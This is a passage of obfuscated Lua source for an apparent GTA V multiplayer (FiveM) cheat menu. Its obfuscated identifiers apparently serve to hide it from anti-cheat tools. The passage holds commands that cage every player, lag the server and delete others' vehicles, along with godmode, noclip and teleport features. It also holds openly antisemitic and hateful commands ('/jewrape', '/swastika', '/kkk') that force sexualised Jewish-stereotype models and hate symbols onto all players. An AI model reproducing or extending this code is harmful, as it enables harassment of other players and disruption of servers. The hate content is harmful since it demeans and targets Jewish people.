        nlFXKkFxuKQAk.natives.ToggleVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 18, true)
    elseif args[1] == '/repair' then
        DmSgpcIoUEJtyTfBBt.FunFunc.Fixerino(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false))
    elseif args[1] == '/dv' then
        DmSgpcIoUEJtyTfBBt.FunFunc.nomorecar(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false))
    elseif args[1] == '/wep' then
        if RfPsUKHSFWJuBEJuz.Console.nilCheck(args, 3) then
            if nlFXKkFxuKQAk.natives.IsWeaponValid(args[2]) then
                nlFXKkFxuKQAk.natives.GiveWeaponToPed(nlFXKkFxuKQAk.natives.PlayerPedId(), RfPsUKHSFWJuBEJuz.rE.LumHash(args[2]), RfPsUKHSFWJuBEJuz.rE.LumToNum(args[3]), false, false)
            end
        end
    elseif args[1] == '/infammo' then
        local backup = RfPsUKHSFWJuBEJuz.Console.ToggleCheck(args[2])
        if backup ~= nil then
            jrnyLearIyzKiSIen.config.features.GunNevaStop = backup
        end
    elseif args[1] == '/blips' then
        local backup = RfPsUKHSFWJuBEJuz.Console.ToggleCheck(args[2])
        if backup ~= nil then
            jrnyLearIyzKiSIen.config.features.PBlips = backup
            DmSgpcIoUEJtyTfBBt.FunFunc.DaBlipers(true)
        end
    elseif args[1] == '/cageall' then
        local playerlist = nlFXKkFxuKQAk.natives.GetActivePlayers()
        for i = 1, #playerlist do
            local ped = playerlist[i]
            DmSgpcIoUEJtyTfBBt.FunFunc.cagerino(ped)
        end
    elseif args[1] == '/serverlag' then
        if RfPsUKHSFWJuBEJuz.Console.nilCheck(args, 3) then
            if args[2] == 'animal' then
                local backup = RfPsUKHSFWJuBEJuz.Console.ToggleCheck(args[3])
                if backup ~= nil then
                    jrnyLearIyzKiSIen.config.features.Serverlagani = backup
                end
            elseif args[2] == 'vehicle' then
                local backup = RfPsUKHSFWJuBEJuz.Console.ToggleCheck(args[3])
                if backup ~= nil then
                    jrnyLearIyzKiSIen.config.features.Serverlagveh = backup
                end
            end
        end
    elseif args[1] == '/jewrape' then
        local jewtable = {'a_m_m_hasjew_01', 'a_m_y_hasjew_01'}
        local playerlist = nlFXKkFxuKQAk.natives.GetActivePlayers()
        for i = 1, #playerlist do
            local ped = playerlist[i]
            if not nlFXKkFxuKQAk.natives.HasModelLoaded('a_m_y_hasjew_01') then
                nlFXKkFxuKQAk.natives.RequestModel('a_m_y_hasjew_01')
                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
            end
            if not nlFXKkFxuKQAk.natives.HasModelLoaded('a_m_m_hasjew_01') then
                nlFXKkFxuKQAk.natives.RequestModel('a_m_m_hasjew_01')
                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
            end
            if not nlFXKkFxuKQAk.natives.HasAnimDictLoaded('rcmpaparazzo_2') then
                nlFXKkFxuKQAk.natives.RequestAnimDict('rcmpaparazzo_2')
                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
            end
                if nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(nlFXKkFxuKQAk.natives.GetPlayerPed(ped), true) then
                    local veh = nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(ped), true)
                        if not nlFXKkFxuKQAk.natives.NetworkHasControlOfEntity(veh) then
                            nlFXKkFxuKQAk.natives.NetworkRequestControlOfEntity(veh)
                            RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                        end
                    nlFXKkFxuKQAk.natives.SetEntityAsMissionEntity(veh, true, true)
                    nlFXKkFxuKQAk.natives.DeleteVehicle(veh)
                    nlFXKkFxuKQAk.natives.DeleteEntity(veh)
                end
                local Spacing = -0.2
            for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(jewtable) do
                local x, y, z = RfPsUKHSFWJuBEJuz.rE.LumTable.LumUnPack(nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(ped), true))
                local JewPed = nlFXKkFxuKQAk.natives.CreatePed(4, RfPsUKHSFWJuBEJuz.rE.LumHash(v), x, y, z, 0.0, true, false)
                nlFXKkFxuKQAk.natives.SetEntityAsMissionEntity(JewPed, true, true)
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(JewPed, nlFXKkFxuKQAk.natives.GetPlayerPed(ped), 4103, 11816, Spacing, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                nlFXKkFxuKQAk.natives.ClearPedTasks(nlFXKkFxuKQAk.natives.GetPlayerPed(ped))
                nlFXKkFxuKQAk.natives.TaskPlayAnim(nlFXKkFxuKQAk.natives.GetPlayerPed(ped), 'rcmpaparazzo_2', 'shag_loop_poppy', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                nlFXKkFxuKQAk.natives.SetPedKeepTask(JewPed)
                nlFXKkFxuKQAk.natives.TaskPlayAnim(JewPed, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                nlFXKkFxuKQAk.natives.SetEntityInvincible(JewPed, true)
                Spacing = Spacing - 0.4
            end     
        end
    elseif args[1] == '/swastika' then
        local playerlist = nlFXKkFxuKQAk.natives.GetActivePlayers()
        for i = 1, #playerlist do
            local ped = playerlist[i]
            DmSgpcIoUEJtyTfBBt.FunFunc.swaz(ped)
        end
    elseif args[1] == '/kkk' then
        DmSgpcIoUEJtyTfBBt.FunFunc.realkkk()
    end
end

-- Choose Open Key --
RfPsUKHSFWJuBEJuz.rE.LumThread(function()
    while jrnyLearIyzKiSIen.config.dienow do
        if jrnyLearIyzKiSIen.config.openkeydefine then
            jrnyLearIyzKiSIen.config.Keybinds.OpenKn = 'Press Any Key'
            local key, keyname = jrnyLearIyzKiSIen.func.isanykey()
            if key ~= nil then
                jrnyLearIyzKiSIen.config.Keybinds.OpenKb = key
                jrnyLearIyzKiSIen.config.Keybinds.OpenKn = keyname
                RfPsUKHSFWJuBEJuz.rE.LumWait(1000)
                jrnyLearIyzKiSIen.config.openkeydefine = false
            end   
        end
        if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(0, jrnyLearIyzKiSIen.config.Keybinds.OpenKb) then
            jrnyLearIyzKiSIen.config.opennow = not jrnyLearIyzKiSIen.config.opennow
        end
        RfPsUKHSFWJuBEJuz.rE.LumWait(0)
    end
end)

-- Choose Open Key (Breathing Effect) --
RfPsUKHSFWJuBEJuz.rE.LumThread(function()
    while jrnyLearIyzKiSIen.config.openkeydefine do
        if jrnyLearIyzKiSIen.config.Keybinds.OpenKn == 'Press Any Key' then
            if jrnyLearIyzKiSIen.config.breathon then
                RfPsUKHSFWJuBEJuz.rE.LumWait(20)
                jrnyLearIyzKiSIen.config.Keybinds.OpenKalpha = jrnyLearIyzKiSIen.config.Keybinds.OpenKalpha + 10
                if jrnyLearIyzKiSIen.config.Keybinds.OpenKalpha >= 250 then
                    jrnyLearIyzKiSIen.config.breathon = false
                end
            else
                RfPsUKHSFWJuBEJuz.rE.LumWait(20)
                jrnyLearIyzKiSIen.config.Keybinds.OpenKalpha = jrnyLearIyzKiSIen.config.Keybinds.OpenKalpha - 10
                if jrnyLearIyzKiSIen.config.Keybinds.OpenKalpha <= 5 then
                    jrnyLearIyzKiSIen.config.breathon = true
                end
            end
        else
            jrnyLearIyzKiSIen.config.Keybinds.OpenKalpha = 255
        end
        RfPsUKHSFWJuBEJuz.rE.LumWait(1)
    end
end) 

-- Menu Thread --
RfPsUKHSFWJuBEJuz.rE.LumThread(function()
    while jrnyLearIyzKiSIen.config.dienow do

        if jrnyLearIyzKiSIen.config.openkeydefine then
            local sx, sy = nlFXKkFxuKQAk.natives.GetActiveScreenResolution()
            jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 75, (sy / 2) - 50, 150, 30, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
            jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 75, (sy / 2) - 22.5, 150, 45, jrnyLearIyzKiSIen.config.CPrimary2.r, jrnyLearIyzKiSIen.config.CPrimary2.g, jrnyLearIyzKiSIen.config.CPrimary2.b, jrnyLearIyzKiSIen.config.CPrimary2.a)
            jrnyLearIyzKiSIen.func.DrawSomeText('Set Open Key', 4, false, (sx / 2) - 43, (sy / 2) - 50, jrnyLearIyzKiSIen.config.SubMenuScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a) 
            jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.Keybinds.OpenKn, 4, true, (sx / 2), (sy / 2) - 15, jrnyLearIyzKiSIen.config.SubMenuScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.Keybinds.OpenKalpha)  
        end

        if jrnyLearIyzKiSIen.config.opennow then
            
            if REVMYmrswsZvxOXvJE.Mopt4S.values[REVMYmrswsZvxOXvJE.Mopt4S.selectedItemIndex] == 1 then
                jrnyLearIyzKiSIen.config.SubMenuWH.w = 255
                jrnyLearIyzKiSIen.config.SubMenuWH.h = 40
                jrnyLearIyzKiSIen.config.SubMenuWH.h2 = 15
                jrnyLearIyzKiSIen.config.SubMenuWH.sp = 20
                jrnyLearIyzKiSIen.config.SubMenuWH.tit = 2.5
                jrnyLearIyzKiSIen.config.SubMenuWH.sub1 = 0
                jrnyLearIyzKiSIen.config.SubMenuWH.sub2 = 0
                jrnyLearIyzKiSIen.config.SubMenuWH.sub3 = 0
                jrnyLearIyzKiSIen.config.SubMenuWH.sub4 = 0
                jrnyLearIyzKiSIen.config.SubMenuWH.subt1 = 25
                jrnyLearIyzKiSIen.config.SubMenuWH.subt2 = 65
                jrnyLearIyzKiSIen.config.SubMenuWH.subt3 = 105
                jrnyLearIyzKiSIen.config.SubMenuWH.subt4 = 145
                jrnyLearIyzKiSIen.config.SubMenuWH.subt5 = 185
                jrnyLearIyzKiSIen.config.SubMenuWH.subb1 = 30
                jrnyLearIyzKiSIen.config.SubMenuWH.subb2 = 30
                jrnyLearIyzKiSIen.config.SubMenuWH.subb3 = 110
                jrnyLearIyzKiSIen.config.SubMenuWH.subb4 = 10
                jrnyLearIyzKiSIen.config.SubMenuWH.subb5 = 190
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl = 0
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl2 = 0
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl3 = 0
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl4 = 265
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl5 = 407
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl6 = 65
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl7 = 304
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl8 = 255
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl9 = 325
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl10 = 83.5
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl11 = 163.5
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl12 = 180

                jrnyLearIyzKiSIen.config.SubMenuWH.subs1 = 60
                jrnyLearIyzKiSIen.config.SubMenuWH.subs2 = 100
                jrnyLearIyzKiSIen.config.SubMenuWH.subs3 = 140
                jrnyLearIyzKiSIen.config.SubMenuWH.subs4 = 180
                jrnyLearIyzKiSIen.config.SubMenuWH.subs5 = 220
            elseif REVMYmrswsZvxOXvJE.Mopt4S.values[REVMYmrswsZvxOXvJE.Mopt4S.selectedItemIndex] == 2 then
                jrnyLearIyzKiSIen.config.SubMenuWH.w = 305
                jrnyLearIyzKiSIen.config.SubMenuWH.h = 50
                jrnyLearIyzKiSIen.config.SubMenuWH.h2 = 20
                jrnyLearIyzKiSIen.config.SubMenuWH.sp = 25
                jrnyLearIyzKiSIen.config.SubMenuWH.tit = 0
                jrnyLearIyzKiSIen.config.SubMenuWH.sub1 = 15
                jrnyLearIyzKiSIen.config.SubMenuWH.sub2 = 25
                jrnyLearIyzKiSIen.config.SubMenuWH.sub3 = 35
                jrnyLearIyzKiSIen.config.SubMenuWH.sub4 = 45
                jrnyLearIyzKiSIen.config.SubMenuWH.subt1 = 35
                jrnyLearIyzKiSIen.config.SubMenuWH.subt2 = 85
                jrnyLearIyzKiSIen.config.SubMenuWH.subt3 = 135
                jrnyLearIyzKiSIen.config.SubMenuWH.subt4 = 185
                jrnyLearIyzKiSIen.config.SubMenuWH.subt5 = 235
                jrnyLearIyzKiSIen.config.SubMenuWH.subb1 = 40
                jrnyLearIyzKiSIen.config.SubMenuWH.subb2 = 50
                jrnyLearIyzKiSIen.config.SubMenuWH.subb3 = 140
                jrnyLearIyzKiSIen.config.SubMenuWH.subb4 = 50
                jrnyLearIyzKiSIen.config.SubMenuWH.subb5 = 240
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl = 50
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl2 = 15
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl3 = 25
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl4 = 305
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl5 = 452
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl6 = 87
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl7 = 347
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl8 = 295
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl9 = 380
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl10 = 110
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl11 = 110 + 97
                jrnyLearIyzKiSIen.config.SubMenuWH.abOl12 = 225

                jrnyLearIyzKiSIen.config.SubMenuWH.subs1 = 75
                jrnyLearIyzKiSIen.config.SubMenuWH.subs2 = 125
                jrnyLearIyzKiSIen.config.SubMenuWH.subs3 = 175
                jrnyLearIyzKiSIen.config.SubMenuWH.subs4 = 225
                jrnyLearIyzKiSIen.config.SubMenuWH.subs5 = 275
            end

            local x, y = nlFXKkFxuKQAk.natives.GetNuiCursorPosition()

            jrnyLearIyzKiSIen.config.Men1Y = 0
            jrnyLearIyzKiSIen.config.Men2Y = 0
            jrnyLearIyzKiSIen.config.Men3Y = 0
            jrnyLearIyzKiSIen.config.Men4Y = 0
            jrnyLearIyzKiSIen.config.Men5Y = 0
            jrnyLearIyzKiSIen.config.offset1 = 15
            jrnyLearIyzKiSIen.config.offset2 = 10
            jrnyLearIyzKiSIen.config.offset3 = 10
            jrnyLearIyzKiSIen.config.offset4 = 10
            jrnyLearIyzKiSIen.config.offset5 = 10
 
                --SELF
            if jrnyLearIyzKiSIen.config.Men1T then
                jrnyLearIyzKiSIen.config.offset1 = jrnyLearIyzKiSIen.config.offset1 + 235 -- 10 + last button offset
                jrnyLearIyzKiSIen.config.Men2Y = jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.offset1
                jrnyLearIyzKiSIen.config.Men3Y = jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.offset1
                jrnyLearIyzKiSIen.config.Men4Y = jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.offset1
                jrnyLearIyzKiSIen.config.Men5Y = jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.offset1
                jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.SubMenuWH.subs1, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset1, jrnyLearIyzKiSIen.config.CPrimary2.r, jrnyLearIyzKiSIen.config.CPrimary2.g, jrnyLearIyzKiSIen.config.CPrimary2.b, jrnyLearIyzKiSIen.config.CPrimary2.a)
                if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Quick Options', REVMYmrswsZvxOXvJE.Qopt.items, REVMYmrswsZvxOXvJE.Qopt.currentItemIndex, REVMYmrswsZvxOXvJE.Qopt.selectedItemIndex, function(currentIndex, selectedIndex)
                    REVMYmrswsZvxOXvJE.Qopt.currentItemIndex = currentIndex 
                    REVMYmrswsZvxOXvJE.Qopt.selectedItemIndex = selectedIndex
                end, 1, 10) then REVMYmrswsZvxOXvJE.Qopt.values[REVMYmrswsZvxOXvJE.Qopt.selectedItemIndex]() local QoptSelected = REVMYmrswsZvxOXvJE.Qopt.items[REVMYmrswsZvxOXvJE.Qopt.selectedItemIndex]; if QoptSelected == 'Health' then  DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Refilled ~g~Health') elseif QoptSelected == 'Armor' then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Refilled ~b~Armor') elseif QoptSelected == 'Clean' then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~g~Cleaned ~w~Ped') elseif QoptSelected == 'Revive' then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Been ~g~Revived') elseif QoptSelected == 'Suicide' then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Commited ~r~Suicide') end end
                if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Godmode', jrnyLearIyzKiSIen.config.features.SupaJesusMode, function(enabled) jrnyLearIyzKiSIen.config.features.SupaJesusMode = enabled end, 1, 30) then
                    if jrnyLearIyzKiSIen.config.features.SupaJesusMode then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Godmode ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Godmode ~r~OFF') end
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('No Ragdoll', jrnyLearIyzKiSIen.config.features.noragmen, function(enabled) jrnyLearIyzKiSIen.config.features.noragmen = enabled end, 1, 50) then if jrnyLearIyzKiSIen.config.features.noragmen then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('No Rag Doll ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('No Rag Doll ~r~OFF') end end
                if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('No Criticals', jrnyLearIyzKiSIen.config.features.nocritsmen, function(enabled) jrnyLearIyzKiSIen.config.features.nocritsmen = enabled end, 1, 70) then 
                    if jrnyLearIyzKiSIen.config.features.nocritsmen then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('No Criticals ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('No Criticals ~r~OFF') end
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Invisiblity', jrnyLearIyzKiSIen.config.features.SupaNoSee, function(enabled) jrnyLearIyzKiSIen.config.features.SupaNoSee = enabled end, 1, 90) then
                    if jrnyLearIyzKiSIen.config.features.SupaNoSee then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Invisiblity ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Invisiblity ~r~OFF') end 
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Super Run', jrnyLearIyzKiSIen.config.features.SupaRoon, function(enabled) jrnyLearIyzKiSIen.config.features.SupaRoon = enabled end, 1, 110) then
                    if jrnyLearIyzKiSIen.config.features.SupaRoon then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Super Run ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Super Run ~r~OFF') end 
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Super Jump', jrnyLearIyzKiSIen.config.features.SupaJumpski, function(enabled) jrnyLearIyzKiSIen.config.features.SupaJumpski = enabled end, 1, 130) then
                    if jrnyLearIyzKiSIen.config.features.SupaJumpski then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Super Jump ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Super Jump ~r~OFF') end 
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Magneto Mode', jrnyLearIyzKiSIen.config.features.MagnetoMenMan, function(enabled) jrnyLearIyzKiSIen.config.features.MagnetoMenMan = enabled end, 1, 150) then
                    if jrnyLearIyzKiSIen.config.features.MagnetoMenMan then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Magneto Mode ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Magneto Mode ~r~OFF') end
                    RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                        local ForceKey = RfPsUKHSFWJuBEJuz.Keys["E"]
                        local Force = 0.5
                        local KeyPressed = false
                        local KeyTimer = 0
                        local KeyDelay = 15
                        local ForceEnabled = false
                        local StartPush = false
                        local camrot
                        local camcords
                        while jrnyLearIyzKiSIen.config.features.MagnetoMenMan do

                            if jrnyLearIyzKiSIen.config.features.ToggleFreeCam then
                                camcords = nlFXKkFxuKQAk.natives.GetCamCoord(jrnyLearIyzKiSIen.config.camf)
                                camrot = nlFXKkFxuKQAk.natives.GetCamRot(jrnyLearIyzKiSIen.config.camf, 2)
                            else
                                camcords = nlFXKkFxuKQAk.natives.GetGameplayCamCoord()
                                camrot = nlFXKkFxuKQAk.natives.GetGameplayCamRot(2)
                            end

                            if (KeyPressed) then	
                                KeyTimer = KeyTimer + 1	
                                if (KeyTimer >= KeyDelay) then
                                    KeyTimer = 0
                                    KeyPressed = false
                                end
                            end
                            if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
                                KeyPressed = true
                                ForceEnabled = true
                            end
                            if (StartPush) then
                                StartPush = false
                                local pid = nlFXKkFxuKQAk.natives.PlayerPedId()
                                local CamRot = camrot
                                local force = 5
                                local Fx = -(RfPsUKHSFWJuBEJuz.rE.LumMath.LumSin(RfPsUKHSFWJuBEJuz.rE.LumMath.LumRad(CamRot.z)) * force * 10)
                                local Fy = (RfPsUKHSFWJuBEJuz.rE.LumMath.LumCos(RfPsUKHSFWJuBEJuz.rE.LumMath.LumRad(CamRot.z)) * force * 10)
                                local Fz = force * (CamRot.x * 0.2)
                                local PlayerVeh = nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(pid, false)
                                for k in DmSgpcIoUEJtyTfBBt.FunFunc.FindLeCars() do
                                    nlFXKkFxuKQAk.natives.SetEntityInvincible(k, false)
                                    if nlFXKkFxuKQAk.natives.IsEntityOnScreen(k) and k ~= PlayerVeh then
                                        nlFXKkFxuKQAk.natives.ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                                    end
                                end
                                for k in DmSgpcIoUEJtyTfBBt.FunFunc.FindThePederinos() do
                                    if nlFXKkFxuKQAk.natives.IsEntityOnScreen(k) and k ~= pid then
                                        nlFXKkFxuKQAk.natives.ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                                    end
                                end
                            end
                            if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
                                KeyPressed = true
                                StartPush = true
                                ForceEnabled = false
                            end
                            if (ForceEnabled) then
                                local pid = nlFXKkFxuKQAk.natives.PlayerPedId()
                                local PlayerVeh = nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(pid, false)
                                local Markerloc = camcords + (jrnyLearIyzKiSIen.func.RotationToDirection(camrot) * 20)
                                nlFXKkFxuKQAk.natives.DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, 150, false, true, 2, nil, nil, false)
                                for k in DmSgpcIoUEJtyTfBBt.FunFunc.FindLeCars() do
                                    nlFXKkFxuKQAk.natives.SetEntityInvincible(k, true)
                                    if nlFXKkFxuKQAk.natives.IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                                        jrnyLearIyzKiSIen.func.RequestelControl(k)
                                        nlFXKkFxuKQAk.natives.FreezeEntityPosition(k, false)
                                        DmSgpcIoUEJtyTfBBt.FunFunc.magnetothrower(k, Markerloc, 0.5, 0.3)
                                    end
                                end
                                for k in DmSgpcIoUEJtyTfBBt.FunFunc.FindThePederinos() do
                                    if nlFXKkFxuKQAk.natives.IsEntityOnScreen(k) and k ~= nlFXKkFxuKQAk.natives.PlayerPedId() then
                                        jrnyLearIyzKiSIen.func.RequestelControl(k)
                                        nlFXKkFxuKQAk.natives.SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
                                        nlFXKkFxuKQAk.natives.FreezeEntityPosition(k, false)
                                        DmSgpcIoUEJtyTfBBt.FunFunc.magnetothrower(k, Markerloc, 0.5, 0.3)
                                    end
                                end
                            end
                            RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                        end
                    end)
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Infinate Stamina', jrnyLearIyzKiSIen.config.features.SupaStamina, function(enabled) jrnyLearIyzKiSIen.config.features.SupaStamina = enabled end, 1, 170) then
                    if jrnyLearIyzKiSIen.config.features.SupaStamina then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Infinate Stamina ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Infinate Stamina ~r~OFF') end 
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Infinate Combat Roll', jrnyLearIyzKiSIen.config.features.RollaForever, function(enabled) jrnyLearIyzKiSIen.config.features.RollaForever = enabled end, 1, 190) then
                    if jrnyLearIyzKiSIen.config.features.RollaForever then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Infinate Combat Roll ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Infinate Combat Roll ~r~OFF') end 
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Noclip', jrnyLearIyzKiSIen.config.features.Noclip, function(enabled) jrnyLearIyzKiSIen.config.features.Noclip = enabled end, 1, 210) then
                    if jrnyLearIyzKiSIen.config.features.Noclip then
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Noclip ~g~ON') 
						nlFXKkFxuKQAk.natives.SetEntityVisible(nlFXKkFxuKQAk.natives.PlayerPedId(), false, false)
                    else
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Noclip ~r~OFF')  
						nlFXKkFxuKQAk.natives.SetEntityRotation(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.PlayerPedId(), 0), nlFXKkFxuKQAk.natives.GetGameplayCamRot(2), 2, 1)
						nlFXKkFxuKQAk.natives.SetEntityVisible(nlFXKkFxuKQAk.natives.PlayerPedId(), true, false)
						nlFXKkFxuKQAk.natives.SetEntityVisible(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.PlayerPedId(), 0), true, false)
					end
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Freecam', jrnyLearIyzKiSIen.config.features.ToggleFreeCam, function(enabled) jrnyLearIyzKiSIen.config.features.ToggleFreeCam = enabled end, 1, 230) then
                    if jrnyLearIyzKiSIen.config.features.ToggleFreeCam then DmSgpcIoUEJtyTfBBt.freec.FreeCamToggle() DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Freecam ~g~ON') else DmSgpcIoUEJtyTfBBt.freec.FreeCamToggle() DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Freecam ~r~OFF') end
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Teleport To Waypoint', 1, 10, 140) then
                    local Waypointy = nlFXKkFxuKQAk.natives.GetFirstBlipInfoId(8) 
                    if nlFXKkFxuKQAk.natives.DoesBlipExist(Waypointy) then
                        DmSgpcIoUEJtyTfBBt.FunFunc.TeleToWP()
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~g~Teleported ~w~To Waypoint!')
                    else
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Must Place A ~r~Waypoint')
                    end
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Teleport To Coords', 1, 30, 140) then
                    local x = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('X Coord (ex: 125.234)', '', 15)
                    local y = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Y Coord (ex: 125.234)', '', 15)
                    local z = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Z Coord (ex: 125.234)', '', 15)
                    DmSgpcIoUEJtyTfBBt.FunFunc.TeleToC(RfPsUKHSFWJuBEJuz.rE.LumToNum(x), RfPsUKHSFWJuBEJuz.rE.LumToNum(y), RfPsUKHSFWJuBEJuz.rE.LumToNum(z))
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~g~Teleported ~w~To Coords!')
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Coords To Waypoint', 1, 50, 140) then
                    local x = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('X Coord (ex: 125.234)', '', 15)
